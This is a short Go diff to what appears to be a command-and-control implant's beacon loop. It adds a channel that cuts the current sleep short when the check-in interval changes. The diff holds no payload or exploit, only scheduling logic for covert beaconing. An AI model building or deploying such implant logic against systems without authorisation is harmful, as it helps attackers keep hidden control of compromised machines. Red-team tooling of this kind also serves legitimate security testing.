@@ -311,16 +311,23 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 	// until all tasks complete (in success or failure), if a task handler blocks
 	// forever it will simply block this set of tasks instead of the entire beacon
 	errors := make(chan error)
+	shortCircuit := make(chan struct{})
 	for {
 		duration := beacon.Duration()
 		nextCheckin = time.Now().Add(duration)
 		go func() {
+			oldInterval := beacon.Interval()
 			err := beaconMain(beacon, nextCheckin)
 			if err != nil {
 				// {{if .Config.Debug}}
 				log.Printf("[beacon] main error: %v", nextCheckin)
 				// {{end}}
 				errors <- err
+			} else if oldInterval != beacon.Interval() {
+				// The beacon's interval was modified so we need to short circuit
+				// the current sleep and tell the server when the next checkin will
+				// be based on the new interval.
+				shortCircuit <- struct{}{}
 			}
 		}()
 
@@ -331,6 +338,8 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 		case <-errors:
 			return err
 		case <-time.After(duration):
+		case <-shortCircuit:
+			// Short circuit current duration with no error
 		}
 	}
 	return nil
